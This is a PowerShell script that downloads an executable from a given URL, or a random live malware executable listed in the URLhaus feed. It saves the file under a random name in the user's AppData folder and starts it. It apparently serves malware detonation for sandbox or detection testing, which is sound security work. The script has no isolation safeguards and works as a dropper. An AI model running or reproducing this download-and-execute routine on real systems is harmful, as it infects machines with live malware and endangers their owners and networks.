param (
  [string] $url,
  [switch] $random
)

function Display-Parameters {
  Write-Host "-url <source URL>    Download file from a given URL."
  Write-Host "-random              Download a random file from the URLhaus feed."
}

if (!$url -And !$random) {
  Write-Host "Please specify a mode of operation."
  Display-Parameters
  exit 1
}

if ($url -And $random) {
  Write-Host "You must specify only one mode of operation."
  Display-Parameters
  exit 1
}

if ($random) {
  Write-Host "Retrieving online URLs from URLhaus..."
  $request = Invoke-WebRequest -Uri "https://urlhaus.abuse.ch/downloads/csv_online/"

  if ($request.StatusCode -ne 200) {
    Write-Host "Failed to query URLhaus."
    exit 1
  }

  Write-Host "Parsing CSV and selecting random URL..."
  $csv = $request.Content | ConvertFrom-Csv -Delimiter "," -Header "id", "dateadded", "url", "url_status", "threat", "tags", "urlhaus_link", "reporter"
  $online_exe = $csv.Where{$_.tags -contains "exe"}
  $random_exe = Get-Random -InputObject $online_exe
  $url = $random_exe.url
}

Write-Host "Source URL defined as: $url"

$filename = -join ((48..57) + (65..90) + (97..122) | Get-Random -Count 8 | % {[char]$_})
$outfile = "$env:APPDATA\$filename.exe"

Write-Host "Downloading file..."
(New-Object System.Net.WebClient).DownloadFile($url, $outfile)

if ((Test-Path $outfile) -eq $false) {
  Write-Host "File did not successfully save."
  exit 1
}

Write-Host "Successfully saved as: $outfile"
Write-Host "Starting process..."
$process = Start-Process $outfile -PassThru
$process_id = $process.Id

if ((Get-Process -Id $process_id -ErrorAction SilentlyContinue) -eq $null) {
  Write-Host "Failed to start process."
  exit 1
}

Write-Host "Process started with PID: $process_id"